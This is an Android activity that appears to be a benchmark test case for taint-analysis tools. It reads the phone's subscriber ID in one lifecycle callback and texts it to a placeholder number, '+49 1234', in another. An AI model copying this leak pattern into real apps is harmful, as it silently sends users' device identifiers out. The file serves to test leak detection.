package de.ecspride;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

/**
 * @testcase_name ActivityLifecycle3
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security
 and Privacy by Design (EC SPRIDE) 
 * @author_mail siegfried.rasthofer@cased.de
 * 
 * @description The return value of source method is stored to a static variable
 in one callback method
 *  and sent to a sink in a different callback method
 * @dataflow onSaveInstanceState: source -> s; onRestoreInstanceState: s -> sink
 * @number_of_leaks 1
 * @challenges the analysis must be able to handle the activity lifecycle
 correctly,
 *  in particular the less common instanceState callbacks
 */
public class MainActivity extends Activity {
    public String s;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }
    
    @Override
    public void onSaveInstanceState(Bundle outState) {
        TelephonyManager telephonyManager =
          (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        s = telephonyManager.getSubscriberId();
    }
    
    @Override
    public void onRestoreInstanceState(Bundle outState) {
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("+49 1234", null, s, null, null);
    }
    
    public MainActivity() { super(); }
    
    public static final String jlc$CompilerVersion$jl7 = "2.7.1";
    public static final long jlc$SourceLastModified$jl7 = 1478515051000L;
    public static final String jlc$ClassType$jl7 =
      ("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" +
       "YNHkorCe+/76793xncW3xe3iP13dPwIvFAAA");
}
